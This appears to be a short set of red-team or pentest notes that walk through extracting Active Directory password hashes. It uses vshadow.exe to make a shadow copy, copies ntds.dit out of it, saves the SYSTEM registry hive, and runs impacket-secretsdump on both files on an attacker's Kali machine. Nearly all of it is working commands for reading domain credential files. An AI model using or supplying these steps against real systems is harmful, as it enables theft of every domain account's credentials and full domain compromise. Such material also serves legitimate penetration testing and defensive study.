# This method attemps to make a snapshot of the database in which are stored sensible information about other entities of the domain in order to be transfered to out kali machine.
# Requirements:
#
#  - vshadow.exe binary, part of the Windows SDK.
#  - Be part of the Domain Admins group or have full control of the Domain Controller.
#
# In first place, we perform a backup file of the database through a shell with administrator privielges:

vshadow.exe -nw -p  C:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

# Then, we make a backup file of the SYSTEM hive of the Windows Registry:

reg.exe save hklm\system c:\system.bak

# Then we transfer both files over our kali machine and extract the hashes with Impacket Collection:

impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
